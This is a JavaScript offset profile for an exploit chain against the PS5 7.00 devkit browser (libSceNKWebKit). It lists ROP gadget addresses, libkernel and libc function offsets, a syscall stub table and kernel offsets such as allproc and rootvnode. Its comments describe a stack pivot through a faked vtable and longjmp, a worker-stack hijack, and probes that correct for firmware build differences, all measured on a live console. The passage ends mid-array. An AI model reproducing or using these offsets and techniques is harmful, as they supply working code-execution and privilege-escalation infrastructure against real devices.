// 07.00 (devkit, PS5UPDATE-devkit-7_00_00_44) -- generated from
// libSceNKWebKit / libkernel_web / libSceLibcInternal / 700_dvk_kernel.elf.
// file offset = rva + 0x4000

// host-constructor candidates: webkitBase = nativeCtorAddr - hc
// parseInt's NativeExecutable::m_constructor is callHostFunctionAsConstructor
// (JSObject.cpp passes it to JSFunction::create for every putDirectNativeFunction).
// This build has clang CFI, so the *address-taken* value is the function's
// jump-table entry, NOT its body: the body is at 0x003B5780 and three 8-byte
// `jmp rel32; int3 int3 int3` slots point at it. Only 0x00010AE8 yields a
// 0x4000-aligned base (measured ctor 0x835470ae8 -> base 0x835460000); main.js
// rejects the other two on alignment, exactly as it does for 9.00's three.
const OFFSET_wk_host_constructor_candidates = [0x00010AE8, 0x00010590, 0x000114C0];
// Exact WKDownloadGetTypeID export (NID -x5vK4NNNYM).
const OFFSET_wk_vtable_first_element     = 0x006E6910;
// Import GOT slots, MEASURED on the console, not taken from the relocation
// tables. DT_JMPREL/DT_RELA give r_offset 0x03E16EE0 (memset, 8zTFvBIAIN8#P#Q)
// and 0x03E14910 (__stack_chk_guard, f7uOxY9mM1U#C#D), but at runtime those
// two addresses hold WebKit-internal code pointers -- they are in .data.rel.ro
// among the vtables, not in the import GOT. Sweeping the RW data segments for
// pointers leaving the module and testing them against the known symbol
// offsets found the real slots exactly one 16KB page higher, independently for
// both symbols:
//   __stack_chk_guard  reloc 0x03E14910 -> real 0x03E18910   (+0x4000)
//   memset             reloc 0x03E16EE0 -> real 0x03E1AEE0   (+0x4000)
// Measured values: guard 0x80e5411d0 -> libkernel_web 0x80e4d4000,
// memset 0x82b9cce70 -> libSceLibcInternal 0x82b9b8000; both 0x4000-aligned and
// both inside their module's image. If another firmware's profile is ever
// derived the same way, check for this page bias before trusting r_offset.
const OFFSET_wk_memset_import                  = 0x03E1AEE0;
const OFFSET_wk___stack_chk_guard_import       = 0x03E18910;

const OFFSET_lk___stack_chk_guard              = 0x0006D1D0;
const OFFSET_lk_pthread_create_name_np         = 0x00001CE0;
const OFFSET_lk_pthread_join                   = 0x00032820;
const OFFSET_lk_pthread_exit                   = 0x00022630;
// Stage-5 payload loader ABI.  These exact scePthread exports are used by the
// original AioShellcode loader together with an explicit 0x80000-byte stack.
const OFFSET_lk_scePthreadCreate               = 0x0000E220;
const OFFSET_lk_scePthreadJoin                 = 0x00014A40;
const OFFSET_lk_scePthreadAttrInit             = 0x000295F0;
const OFFSET_lk_scePthreadAttrSetstacksize     = 0x000176C0;
const OFFSET_lk_scePthreadAttrSetdetachstate   = 0x00016EC0;
const OFFSET_lk_scePthreadAttrDestroy          = 0x00020530;
const OFFSET_lk_sceKernelSendNotificationRequest = 0x00008BE0;
const OFFSET_lk_sysctlbyname                   = 0x00027330;
const OFFSET_lk_pthread_create                 = 0x00030150;
const OFFSET_lk_getpid                         = 0x00036760;
// TAILQ head written by _thr_link()'s TAILQ_INSERT_HEAD at 0x0002B960
// (tle at +0x38, as main.js assumes).  Same address as 9.00-13.60.
const OFFSET_lk__thread_list                   = 0x00064218;
/* Saved PC the idle Worker parks on, as a RANKED list -- main.js takes the
 * first entry that appears exactly once on the worker stack.
 *
 * MEASURED on a live 7.00 devkit, not read off the binary. The static guess
 * 0x389B1 ("return address of the blocking call inside cond_wait_common
 * 0x38840, the branch pthread_cond_wait takes") is NOT on the stack -- the
 * fingerprint scan found 0 of it. Sweeping the parked worker stack for
 * libkernel pointers produced this chain, newest frame (lowest offset) first:
 *
 *     0x7fb28  lk+0x2d85c   umtx wait wrapper (deepest, in the syscall)
 *     0x7fb48  lk+0x39843   _thr_ucond_wait
 *     0x7fb78  lk+0x38f31   cond_wait_common      <-- 0x38840 + 0x6f1
 *     0x7fc38  lk+0x33d1e   pthread_cond_wait
 *     0x7ffc8  lk+0x39ac0   thread entry (oldest)
 *
 * i.e. exactly libthr's pthread_cond_wait -> cond_wait_common ->
 * _thr_ucond_wait -> _thr_umtx_timedwait_uint. 0x38F31 is the same function
 * the original constant aimed at, just the call site that actually runs, so
 * it keeps the intended pivot frame. The other two are ranked behind it as
 * fallbacks in case a future build shifts that call.
 * The cond_wait selector at lk+0x64014 reads 1 on this console, confirming
 * pthread_cond_wait really does take the 0x38840 body -- so the wrong-body
 * explanation is ruled out and the call site is the whole story.
 * previous (never matched): 0x000389B1
 *
 * RESOLVED: 0x38F31 - 0x580 = 0x389B1 exactly, and 0x39843 - 0x580 = 0x392C3,
 * the return of `call 0x2D380`. Both measured values are the statically derived
 * ones plus 0x580, so the static analysis was right and libkernel_web's text on
 * this console is simply 0x580 higher than in PS5UPDATE-devkit-7_00_00_44.
 * These entries are MEASURED console addresses and must NOT be shifted again. */
const OFFSET_lk_worker_wait_return             = [0x00038F31, 0x00039843, 0x00033D1E];
// Byte that selects WHICH cond_wait_common body pthread_cond_wait calls:
// 1 -> 0x38840 (the body 0x389B1 above was taken from), 0 -> 0x38BE0.
// probe700.html reads this too. main.js reports it when the fingerprint scan
// comes up empty, because a fingerprint from the body that is NOT running can
// never appear on the stack.
const OFFSET_lk_cond_wait_selector             = 0x00064014;
const OFFSET_lk_sleep                          = 0x00025C50;
const OFFSET_lk_sceKernelGetCurrentCpu         = 0x000028A0;

const OFFSET_lc_memset                         = 0x00014E70;
const OFFSET_lc_malloc                         = 0x00005E80;
const OFFSET_lc_free                           = 0x00005E90;
const OFFSET_lc_memcpy                         = 0x00003CD0;
const OFFSET_lc_strcmp                         = 0x000408D0;
const OFFSET_lc_memcmp                         = 0x00040890;
const OFFSET_lc_vsnprintf                      = 0x0005C620;
const OFFSET_lc_setjmp                         = 0x0005AF10;
const OFFSET_lc_longjmp                        = 0x0005AF60;

// Fallback estimate only; main.js fingerprints the saved worker PC at runtime.
const OFFSET_WORKER_STACK_OFFSET         = 0x0007FB68;

// --- gadget substitutions unique to this build ------------------------------
// This libSceNKWebKit has no `pop r9 ; ret` anywhere in .text (63 `pop r9`
// bytes, not one of them followed by a ret) and no `cmp [rcx], eax ; ret`.
// Two documented stand-ins are used instead and rop.js honours both flags.
//
// "pop r9" is really `xor r9d, r9d ; test r9, r9 ; setne al ; ret`: it sets
// r9 = 0 and consumes NO stack slot.  Every 6-argument call in the engine is
// an mmap() whose 6th argument (the offset) is 0, so this is exact; rop.js
// throws if a non-zero r9 is ever requested.  It clobbers al and the flags,
// neither of which is live at that point in push_sysv().
const OFFSET_wk_r9_zero_only             = true;
// "cmp [rcx], eax" is really `cmp eax, [rcx] ; ret`, i.e. the operands are
// swapped.  ZF is unaffected by the swap, so branch_types.EQUAL (the only
// type the engine uses) is exact; rop.js throws on the ordered types.
const OFFSET_wk_cmp_operands_reversed    = true;
/* `mov [rdi], rsi ; ret` at 0x7527F0 does not execute as that instruction on
 * this CONSOLE -- but it is exactly `48 89 37 c3` in the file, and the reason
 * for the mismatch is now understood: 0x7527F0 is above the point where the
 * console's build diverges from ours, so the real store sits at 0x7527F0 plus
 * the shift (see the module-shift probe tables at the end of this file).
 * `mov [rdi], rax` 0x79337 works only because it is BELOW that point. Routing
 * through rax therefore remains correct and costs nothing; it is a symptom,
 * not the fix. Original evidence, all still valid:
 *   probe=rsp  SILENT -- pop rsp 0x6EEE1 and the stack switch both work
 *   probe=p    SILENT -- pop rdi 0x31434 and pop rsi 0xB7098 each consume
 *                        exactly one stack slot and return correctly
 *   probe=w    CRASH  -- those same two pops PLUS this store, twice
 * The store is the only difference between the last two, so 0x7527F0 is it.
 * Route 8-byte stores through `mov [rdi], rax` 0x79337 instead. That one is
 * cross-checked by its own neighbour: "mov [rdi], eax" is 0x79338, exactly one
 * byte later, which is what `48 89 07 C3` vs `89 07 C3` looks like -- the same
 * store with the REX prefix skipped. 0x7527F0 has no such corroboration.
 * rop.js honours this in push_write8, push_copy8 and push_write_ptr8. */
const OFFSET_wk_store_via_rax            = true;
/* Run the gadget conformance suite once prepare() succeeds. This whole profile
 * came out of the same generator that produced the bad 0x7527F0, and the text
 * is execute-only so nothing here can be verified by reading it. With a working
 * chain the remaining gadgets CAN be checked by executing them and comparing
 * the result, which beats discovering the next bad one by bisecting crashes. */
const OFFSET_wk_gadget_selftest          = true;

// --- 7.00 bootstrap: the idle-Worker hijack does not work on JSC 613 --------
// The Worker never parks at a return address any stack scan can find (its wait
// is a raw syscall; the PLT is `jmp [GOT]`, so nothing rets through a slot we
// control). Instead we fake a C++ vtable on the leaked textarea impl, take one
// virtual dispatch to get `rdi = this`, and pivot with longjmp. main.js runs a
// non-destructive milestone first to confirm the virtual call and find the
// trigger op; OFFSET_wk_vtable_trigger is filled in once the device reports it.
const OFFSET_wk_bootstrap                 = "";  // JIT-less: JS-frame (LLInt) pivot is not viable; native worker-stack hijack is the JIT-independent path
// mov rsp, rdi ; ret  -- the pivot for a `rdi = this` virtual call (fallback;
// longjmp is used as the primary pivot since its jmp_buf is fully attacker-built:
// +0x00 rip, +0x10 rsp, standard FreeBSD amd64 layout, confirmed in libc 613).
const OFFSET_wk_stack_pivot_mov_rsp_rdi   = 0x0080C579;
// set once the milestone reports which JS/DOM op yielded the virtual call
const OFFSET_wk_vtable_trigger            = "";
// 7.00's JSC is 613.1; 9.00+ is 616.1. JSArrayBufferView gained a
// `size_t m_byteOffset` member between them, so the tail differs:
//   613: +0x18 size_t m_length, +0x20 uint32 m_mode              sizeof 0x28
//   616: +0x18 size_t m_length, +0x20 size_t m_byteOffset,
//        +0x28 uint8  m_mode                                     sizeof 0x30
// Measured on this console: structureID 0xdc63, butterfly 0x881a24038,
// m_vector 0x881a7ae00, m_length 0x100, and +0x20 = 02 00 00 00 --
// TypedArrayMode 2 == WastefulTypedArray, which is exactly what
// `new Uint8Array(new ArrayBuffer(0x100))` must be. core.js checks m_mode
// here instead of the m_byteOffset that this version does not have.
const OFFSET_jsc_abv_mode_at_0x20        = true;

/* VERIFIED byte-for-byte on 2026-08-21 against
 * PS5UPDATE-devkit-7_00_00_44 .. system_ex_b/common_ex/lib/libSceNKWebKit.sprx
 * (PT_LOAD[0]: vaddr 0, file offset 0x4000, so file = rva + 0x4000).
 * Every entry below decodes to exactly the instruction its name claims, with
 * two deliberate exceptions, both already flagged above:
 *   pop r9        0x010BF949 = 45 31 c9 4d 85 c9 0f 95 c0 c3  (the zeroing
 *                 stand-in; OFFSET_wk_r9_zero_only)
 *   cmp [rcx],eax 0x035F9049 = 3b 01 c3  (operands reversed;
 *                 OFFSET_wk_cmp_operands_reversed)
 * The executable segment runs 0x0 .. 0x3673D22 (54.5 MB), so every address
 * here is inside it. An earlier reading of the probe results -- that text
 * ended near 1.2 MB and the high gadgets pointed into data -- was WRONG;
 * the chain crashes have another cause. */
let wk_gadgetmap = {
	"ret": 0x00000042,
	"pop rdi": 0x00031434,
	"pop rsi": 0x000B7098,
	// 0x21461C, not the 0x214613 this profile shipped: verified `5a c3` in
	// system_ex_b/common_ex/lib/libSceNKWebKit.sprx from
	// PS5UPDATE-devkit-7_00_00_44. 0x214613 is not a pop.
	"pop rdx": 0x0021461C,
	"pop rcx": 0x00032473,
	"pop rax": 0x000A6CAB,
	"pop rsp": 0x0006EEE1,
	"pop r8": 0x004C5D31,
	"pop r9": 0x010BF949,
	"mov [rdi], rsi": 0x007527F0,
	"mov [rdi], rax": 0x00079337,
	"mov [rdi], eax": 0x00079338,
	"mov rax, [rax]": 0x0012A439,
	"add rax, rcx": 0x00024321,
	"cmp [rcx], eax": 0x035F9049,
	"inc dword [rax]": 0x000B70B5,
	"seta al": 0x0021A9C2,
	"setb al": 0x000A2B46,
	"sete al": 0x0001CF1F,
	"setg al": 0x015C5876,
	"setl al": 0x00681ECF,
	"shl rax, 3": 0x02488363,
	"shl rax, 4": 0x00572686,
	"shr rax, 3": 0x01308FC3,
	"shr rax, 4": 0x02D60B54,
	"infloop": 0x000037D1,
};

let syscall_map = {
	0x001: 0x00036A1A,
	0x002: 0x000383E0,
	0x003: 0x000365E0,
	0x004: 0x00036540,
	0x005: 0x00036BE0,
	0x006: 0x00037210,
	0x007: 0x00035E00,
	0x00A: 0x00037F20,
	0x00C: 0x000378B0,
	0x00F: 0x00037290,
	0x014: 0x00036760,
	0x017: 0x00036260,
	0x018: 0x00037890,
	0x019: 0x00036C20,
	0x01B: 0x00036CC0,
	0x01C: 0x00036EF0,
	0x01D: 0x00037A60,
	0x01E: 0x00036160,
	0x01F: 0x00035F80,
	0x020: 0x000380C0,
	0x021: 0x00037BE0,
	0x022: 0x00037D60,
	0x023: 0x00037730,
	0x024: 0x00038610,
	0x025: 0x00036BC0,
	0x027: 0x00036660,
	0x029: 0x00037C40,
	0x02A: 0x000365B0,
	0x02B: 0x00038280,
	0x02C: 0x000385D0,
	0x02F: 0x00036100,
	0x031: 0x000360E0,
	0x032: 0x00037990,
	0x035: 0x00036320,
	0x036: 0x00036480,
	0x037: 0x00037770,
	0x038: 0x00037670,
	0x03B: 0x00036EAD,
	0x041: 0x000372F0,
	0x049: 0x00036AE0,
	0x04A: 0x00037870,
	0x04B: 0x000369D0,
	0x04E: 0x00036BA0,
	0x04F: 0x00036060,
	0x050: 0x00036600,
	0x053: 0x00036040,
	0x056: 0x00035E60,
	0x059: 0x000376D0,
	0x05A: 0x00037AE0,
	0x05C: 0x000370F0,
	0x05D: 0x00036C40,
	0x05F: 0x000360A0,
	0x060: 0x00036FD0,
	0x061: 0x00036820,
	0x062: 0x000378D0,
	0x063: 0x00038240,
	0x064: 0x00035E20,
	0x065: 0x00037E60,
	0x066: 0x000381E0,
	0x068: 0x00037EE0,
	0x069: 0x00037130,
	0x06A: 0x00036420,
	0x071: 0x00037430,
	0x072: 0x00036E00,
	0x074: 0x000385F0,
	0x075: 0x000386D0,
	0x076: 0x00035DE0,
	0x078: 0x00037070,
	0x079: 0x00036ED0,
	0x07A: 0x00037B40,
	0x07C: 0x00036A60,
	0x07D: 0x000372D0,
	0x07E: 0x000381C0,
	0x07F: 0x00036DC0,
	0x080: 0x00037D40,
	0x083: 0x00036D40,
	0x085: 0x00038630,
	0x086: 0x00038460,
	0x087: 0x000377F0,
	0x088: 0x00037570,
	0x089: 0x000367C0,
	0x08A: 0x00035CD0,
	0x08C: 0x00038180,
	0x08D: 0x000372B0,
	0x093: 0x00037510,
	0x0A5: 0x00036000,
	0x0B6: 0x00037FC0,
	0x0B7: 0x00035E40,
	0x0BC: 0x00038020,
	0x0BD: 0x00038420,
	0x0BE: 0x00036DE0,
	0x0BF: 0x000364E0,
	0x0C0: 0x000377B0,
	0x0C2: 0x00036D20,
	0x0C3: 0x00036900,
	0x0C4: 0x00037F40,
	0x0CA: 0x00037D20,
	0x0CB: 0x000373B0,
	0x0CC: 0x00037DC0,
	0x0CE: 0x00036860,
	0x0D1: 0x00036E40,
	0x0E8: 0x00035F00,
	0x0E9: 0x00037370,
	0x0EA: 0x00038390,
	0x0EB: 0x00037F60,
	0x0EC: 0x000366C0,
	0x0ED: 0x00038440,
	0x0EE: 0x000378F0,
	0x0EF: 0x00036A80,
	0x0F0: 0x00037E20,
	0x0F1: 0x00037650,
	0x0F2: 0x00036620,
	0x0F3: 0x000374B0,
	0x0F7: 0x00037EC0,
	0x0FB: 0x000369F9,
	0x0FD: 0x00037A80,
	0x110: 0x00038220,
	0x121: 0x00037930,
	0x122: 0x00036E60,
	0x136: 0x00036B60,
	0x13B: 0x00038040,
	0x144: 0x000366E0,
	0x145: 0x00037B00,
	0x147: 0x000367E0,
	0x148: 0x00037450,
	0x149: 0x00035FA0,
	0x14A: 0x00036E20,
	0x14B: 0x00036C80,
	0x14C: 0x00036220,
	0x14D: 0x00036340,
	0x14E: 0x00036570,
	0x154: 0x00035D30,
	0x155: 0x00035D70,
	0x157: 0x00037C60,
	0x159: 0x00037D80,
	0x15A: 0x000379C0,
	0x16A: 0x00037FA0,
	0x16B: 0x000361E0,
	0x17B: 0x00036180,
	0x188: 0x000362A0,
	0x189: 0x00038710,
	0x18D: 0x00036740,
	0x190: 0x00036300,
	0x191: 0x00037090,
	0x192: 0x00037950,
	0x193: 0x000386F0,
	0x194: 0x00036440,
	0x195: 0x00037E80,
	0x196: 0x00037B60,
	0x197: 0x000362C0,
	0x198: 0x00037B20,
	0x1A0: 0x00038000,
	0x1A1: 0x00037CA0,
	0x1A5: 0x00036964,
	0x1A6: 0x000376B0,
	0x1A7: 0x000377D0,
	0x1AD: 0x000369B0,
	0x1AE: 0x00036080,
	0x1AF: 0x000363E0,
	0x1B0: 0x00036D80,
	0x1B1: 0x00036400,
	0x1B9: 0x00037A40,
	0x1BA: 0x00035D50,
	0x1BB: 0x00036680,
	0x1BC: 0x00037710,
	0x1C6: 0x00035DD0,
	0x1C7: 0x00038140,
	0x1C8: 0x000380A0,
	0x1D0: 0x00037A00,
	0x1D2: 0x00036F90,
	0x1DB: 0x00036720,
	0x1DC: 0x00037850,
	0x1DD: 0x00038120,
	0x1DE: 0x00037C20,
	0x1DF: 0x00036CA0,
	0x1E0: 0x00036700,
	0x1E1: 0x00035CF0,
	0x1E2: 0x00038690,
	0x1E3: 0x00038100,
	0x1E6: 0x00036920,
	0x1E7: 0x00038500,
	0x1E8: 0x00037CC0,
	0x1F3: 0x000360C0,
	0x203: 0x00037790,
	0x20A: 0x000371B0,
	0x214: 0x00037270,
	0x215: 0x00036FF0,
	0x216: 0x000375D0,
	0x217: 0x000364C0,
	0x218: 0x00037310,
	0x21A: 0x00037250,
	0x21B: 0x000366A0,
	0x21C: 0x000375F0,
	0x21D: 0x000371D0,
	0x21E: 0x00037490,
	0x21F: 0x00037C80,
	0x220: 0x00037610,
	0x221: 0x00037BA0,
	0x222: 0x00036990,
	0x223: 0x00037470,
	0x224: 0x00036D60,
	0x225: 0x00036F70,
	0x226: 0x00035F40,
	0x227: 0x00035EC0,
	0x228: 0x000384E0,
	0x229: 0x00037550,
	0x22A: 0x00037B80,
	0x22B: 0x00037810,
	0x22C: 0x000370D0,
	0x22D: 0x00036E80,
	0x22E: 0x00036B80,
	0x22F: 0x00038770,
	0x230: 0x00036640,
	0x233: 0x00036FB0,
	0x234: 0x00036020,
	0x235: 0x00037030,
	0x236: 0x00037050,
	0x237: 0x00037AC0,
	0x23C: 0x000368C0,
	0x249: 0x00037F00,
	0x24A: 0x00036AA0,
	0x24B: 0x00037350,
	0x24C: 0x00035EA0,
	0x24F: 0x000364A0,
	0x250: 0x000367A0,
	0x251: 0x00038260,
	0x252: 0x00037150,
	0x253: 0x00036140,
	0x254: 0x00037FE0,
	0x256: 0x00036F50,
	0x257: 0x000382C0,
	0x258: 0x00035D10,
	0x259: 0x00036880,
	0x25A: 0x00036F10,
	0x25B: 0x00037DA0,
	0x25C: 0x00036380,
	0x25D: 0x00036AC0,
	0x25E: 0x00036280,
	0x25F: 0x000373F0,
	0x260: 0x000386B0,
	0x262: 0x00038750,
	0x263: 0x00036590,
	0x264: 0x000384C0,
	0x265: 0x00035CB0,
	0x267: 0x00037010,
	0x268: 0x000380E0,
	0x269: 0x000376F0,
	0x26A: 0x000373D0,
	0x26B: 0x000361C0,
	0x26C: 0x000362E0,
	0x26E: 0x00035EE0,
	0x26F: 0x00037330,
	0x270: 0x00038730,
	0x271: 0x00037CE0,
	0x272: 0x00036800,
	0x273: 0x00035E80,
	0x274: 0x000374F0,
	0x275: 0x000368A0,
	0x276: 0x000370B0,
	0x278: 0x00038670,
	0x279: 0x00036B40,
	0x27A: 0x00036B00,
	0x27B: 0x00036C00,
	0x27C: 0x00036840,
	0x27D: 0x00037590,
	0x27E: 0x00036940,
	0x27F: 0x00038790,
	0x280: 0x00037910,
	0x281: 0x00036460,
	0x282: 0x00036CE0,
	0x283: 0x00037AA0,
	0x286: 0x000383C0,
	0x287: 0x000375B0,
	0x288: 0x00035F20,
	0x289: 0x00038160,
	0x28C: 0x00035FC0,
	0x28D: 0x00036780,
	0x28E: 0x00036520,
	0x28F: 0x00037F80,
	0x290: 0x00037BC0,
	0x291: 0x00036C60,
	0x292: 0x000363C0,
	0x293: 0x000368E0,
	0x294: 0x00038650,
	0x295: 0x00037E00,
	0x296: 0x00036360,
	0x297: 0x00037190,
	0x298: 0x00036240,
	0x299: 0x00037D00,
	0x29A: 0x00037170,
	0x29B: 0x00036120,
	0x29C: 0x00037830,
	0x29D: 0x000382A0,
	0x29E: 0x000381A0,
	0x29F: 0x00037C00,
	0x2A0: 0x00038060,
	0x2A1: 0x00038200,
	0x2A2: 0x00038080,
	0x2A3: 0x00037110,
	0x2A4: 0x000379E0,
	0x2A5: 0x000374D0,
	0x2A6: 0x00036F30,
	0x2A7: 0x00036500,
	0x2A8: 0x00037230,
	0x2A9: 0x00037A20,
	0x2AA: 0x000361A0,
	0x2AB: 0x00038520,
	0x2AC: 0x00036D00,
	0x2AD: 0x00035F60,
	0x2AE: 0x00035DB0,
	0x2AF: 0x000363A0,
	0x2B0: 0x00036DA0,
	0x2B1: 0x000384A0,
	0x2B2: 0x00037750,
	0x2B3: 0x00037690,
	0x2B4: 0x00037E40,
	0x2B5: 0x00037390,
	0x2B6: 0x000371F0,
	0x2C1: 0x00036200,
	0x2C9: 0x00038480,
	0x2CC: 0x00036A40,
	0x2CD: 0x00037530,
	0x2CE: 0x00036B20,
	0x2CF: 0x00035D90,
	0x2D0: 0x00037DE0,
	0x2D1: 0x00037EA0,
	0x2D2: 0x00035FE0,
	0x2D5: 0x00037630,
};

// Firmware-specific kernel offsets, from 700_dvk_kernel.elf (already the
// unwrapped kernel; the SLB2-wrapped copy is kernel.dec.bin).  Text-relative
// except for the two invariant syscall-stack frame offsets.  Nothing in the
// engine reads these -- allproc is walked at runtime -- so the four Sony
// flag words below are left at 0 rather than guessed.
const OFFSET_KERNEL_STACK_COOKIE                = 0x00000930;
const OFFSET_KERNEL_STACK_SYS_SCHED_YIELD_RET   = 0x00000808;
// kdata_base = text_base + text_size = 0xffffffff80210000 + 0xC50000.
const OFFSET_KERNEL_DATA                        = 0x00C50000;
const OFFSET_KERNEL_SYS_SCHED_YIELD_RET         = 0x00000000; // not derived
// LIST_INIT(&allproc) in procinit() at 0xffffffff8074DEBB -> kdata+0x2859D50.
const OFFSET_KERNEL_ALLPROC                     = 0x034A9D50;
const OFFSET_KERNEL_SECURITY_FLAGS              = 0x00000000; // not derived
const OFFSET_KERNEL_TARGETID                    = 0x00000000; // not derived
const OFFSET_KERNEL_QA_FLAGS                    = 0x00000000; // not derived
const OFFSET_KERNEL_UTOKEN_FLAGS                = 0x00000000; // not derived
// VFS_ROOT(mp, LK_EXCLUSIVE, &rootvnode) at 0xffffffff80E2BCFA -> kdata+0x30C7510.
const OFFSET_KERNEL_ROOTVNODE                   = 0x03D17510;

/* ---------------------------------------------------------------------------
 * Module-shift probe tables.
 *
 * The console is NOT running the build these offsets were generated from.
 * Its own boot log settles it:
 *
 *     secure loader(devkit release) ... releases/07.00_t_release_manu
 *     [SceShellCore]  release: 0x07000070   sys-revision: 205498
 *
 * i.e. 7.00.00.70 "_manu", against PS5UPDATE-devkit-7_00_00_44 on disk -- the
 * closest match available, but 26 revisions away. That is why every address
 * BELOW where the two builds diverge is exact (pop rdi/rsi/rsp, mov [rdi],rax
 * and the whole pivot work) and every address above it is not (the 8-byte
 * store at 0x7527f0, all four shifts, cmp [rcx],eax and every syscall stub).
 * Three facts pinned it down:
 *
 *   - the import GOT is exactly one 16KB page above where DT_RELA says. Text
 *     ends 0x2de bytes short of a page boundary in our file, so any growth
 *     over 0x2de pushes every following segment up by 0x4000 -- observed.
 *   - the parked worker's stack holds lk+0x38f31 and lk+0x39843. Neither is an
 *     instruction boundary in our libkernel_web, but subtract 0x580 and they
 *     become 0x389b1 (the return of cond_wait_common's blocking call, exactly
 *     the address predicted statically) and 0x392c3 (the return of `call
 *     0x2d380`). Two unrelated stack slots, one delta.
 *
 * The tables below let the shift be MEASURED rather than guessed, from data
 * that is readable (text is execute-only, so bytes cannot be compared). Each
 * entry is [slot, addend] from the module's own R_X86_64_RELATIVE relocations:
 * the qword at `slot` must hold base+addend, so whatever it actually holds,
 * minus base and addend, IS the shift at that address. Sorting by addend gives
 * a step profile: 0 below the insertion, the true delta above it.
 *
 * The bias each module needs is detected rather than assumed: a wrong bias
 * reads the NEIGHBOURING relocation and the deltas scatter, so the probe tries
 * 0 / +0x4000 / -0x4000 and keeps whichever yields the fewest distinct deltas.
 *
 * FIRST MEASUREMENT (7.00.00.70, 2026-08-22), report only:
 *   libSceNKWebKit -- two clean steps, +0x0 up to ~0x44a1a0 and +0x2a0 from
 *     ~0x4b0ea0 on. That fits five of the six gadgets known to fail
 *     (0x572686, 0x7527f0, 0x1308fc3, 0x2488363, 0x2d60b54, 0x35f9049 are all
 *     above the cut) and leaves pop rdx 0x21461c, which is BELOW it, as the
 *     one result that does not fit -- its CRASH verdict came from a run that
 *     may simply have re-armed a stale return slot.
 *   libkernel_web -- the eight rodata controls all came back non-zero, so
 *     libkernel_web's rodata content itself moved between .44 and .70 and a
 *     pointer-into-rodata is not a fixed landmark across these two builds.
 *     Its text is +0x580 by the one measurement that does not depend on any
 *     of this: the parked worker's stack holds lk+0x38f31, and 0x38f31-0x580
 *     is 0x389b1, the statically predicted cond_wait_common return.
 *
 * Applying that measurement moved nine gadgets but left pop r8 0x4c5d31 alone,
 * because it fell in the unresolved window -- and fcall() uses pop r8, so the
 * chain desynced and a getpid that had merely returned -1 became a SIGILL.
 * The lesson is in main.js now: a value is trusted only where the landmarks
 * either side of it AGREE, and the gadget map is refused wholesale rather than
 * half-applied if any gadget the chain runs is still unresolved.
 * ------------------------------------------------------------------------- */
const OFFSET_wk_shift_probe = [
	[0x2000, 0x3c5fc40],
	[0x9efe0, 0x3ce45f0],
	[0x1232a0, 0x3d49eb8],
	[0x125060, 0x3d5b578],
	[0x127e90, 0x3ce62a8],
	[0x12a460, 0x3cd83c8],
	[0x12b460, 0x3cfb3b8],
	[0x131330, 0x3d50d30],
	[0x134430, 0x3d4ddc8],
	[0x136430, 0x3c7ad60],
	[0x13ae90, 0x3d8e5d0],
	[0x13be80, 0x3cd8508],
	[0x13de70, 0x3d53f60],
	[0x1423d0, 0x3cd8528],
	[0x149be0, 0x3d8e010],
	[0x14c940, 0x3d5c758],
	[0x1554b0, 0x3cec0d8],
	[0x158fd0, 0x3cd82e0],
	[0x15be10, 0x3cd7d18],
	[0x1606c0, 0x3d54f78],
	[0x164220, 0x3d08738],
	[0x1676a0, 0x3cd8340],
	[0x16c180, 0x3cd7d88],
	[0x174e10, 0x3d37bf0],
	[0x177a10, 0x3d4bc98],
	[0x17b0d0, 0x3d91ea0],
	[0x17d1d0, 0x3d8df58],
	[0x1808e0, 0x3d63540],
	[0x18bb00, 0x3d8ece8],
	[0x191630, 0x3ce4b20],
	[0x195be0, 0x3d8e210],
	[0x197220, 0x3d4c070],
	[0x19aa20, 0x3ced3e8],
	[0x19efd0, 0x3cfdc30],
	[0x1a1f80, 0x3d587c0],
	[0x1a98e0, 0x3d8e280],
	[0x1b48f0, 0x3d58778],
	[0x1b8690, 0x3cfb660],
	[0x1bd530, 0x3c60bb0],
	[0x1bf970, 0x3d3a7b8],
	[0x1c3bc0, 0x3ce13e8],
	[0x1c77d0, 0x3d5b418],
	[0x1cb320, 0x3c77150],
	[0x1cf530, 0x3d44dd8],
	[0x1d4d00, 0x3cd7a88],
	[0x1d7940, 0x3ce4380],
	[0x1d8990, 0x3d9c8b0],
	[0x1da0d0, 0x3d56b08],
	[0x1de630, 0x3d97c78],
	[0x1e45a0, 0x3dbcc90],
	[0x1e73b0, 0x3d8df08],
	[0x1e9980, 0x3d8e350],
	[0x1ec670, 0x3d4df60],
	[0x1eff70, 0x3c05060],
	[0x1f46e0, 0x3d4a620],
	[0x1f7830, 0x3d8dfc0],
	[0x1fbd80, 0x3d4aba8],
	[0x1ff080, 0x3d542f0],
	[0x202790, 0x3de0908],
	[0x209960, 0x3d56b78],
	[0x20acf0, 0x3cd84a8],
	[0x20e950, 0x3ced4a8],
	[0x2114b0, 0x3d5b628],
	[0x218670, 0x3d4ab88],
	[0x218f40, 0x3d46990],
	[0x21e410, 0x3d4ab40],
	[0x221670, 0x3c512e0],
	[0x2748c0, 0x3d4c028],
	[0x310cf8, 0x3bfd230],
	[0x3ad7a0, 0x3d8e318],
	[0x44a1a0, 0x3cd8358],
	[0x4c6ea0, 0x3ce14a0],
	[0x4e8070, 0x3d732d8],
	[0x572690, 0x3ccc588],
	[0x5847d0, 0x3c7c910],
	[0x620500, 0x3ce1498],
	[0x6bf960, 0x3cfa900],
	[0x753040, 0x3d8dfa0],
	[0x759b00, 0x3d5b580],
	[0x7f5ff0, 0x3d4a9f8],
	[0x891f20, 0x3cf5438],
	[0x92e790, 0x3ced5c8],
	[0x9d7c40, 0x3d444d8],
	[0xa6fdf0, 0x3d7c8c0],
	[0xb0d3b0, 0x3cf0ec8],
	[0xbacb30, 0x3cf11b8],
	[0xc40d50, 0x3d45640],
	[0xcdc8c0, 0x3d45c80],
	[0xd76dd0, 0x3cf46e8],
	[0xe13560, 0x3cf5940],
	[0xec5cd0, 0x3d46e98],
	[0xf5b590, 0x3cfaa08],
	[0x101dee0, 0x3cfdc28],
	[0x1098500, 0x3d33030],
	[0x10bf960, 0x3cfb700],
	[0x112bfb0, 0x3cfd058],
	[0x11ffe70, 0x3d06f08],
	[0x1261a50, 0x3d449c0],
	[0x13108a0, 0x3d59840],
	[0x13a4500, 0x3d55fb8],
	[0x1444b10, 0x3d075a0],
	[0x14e96e0, 0x3d3aa88],
	[0x1569f40, 0x3d077a8],
	[0x160b480, 0x3d59938],
	[0x16a3490, 0x3dbc348],
	[0x1740ea0, 0x3d76c80],
	[0x18020d0, 0x3d33928],
	[0x187dc10, 0x3dbc488],
	[0x1946bf0, 0x3d76980],
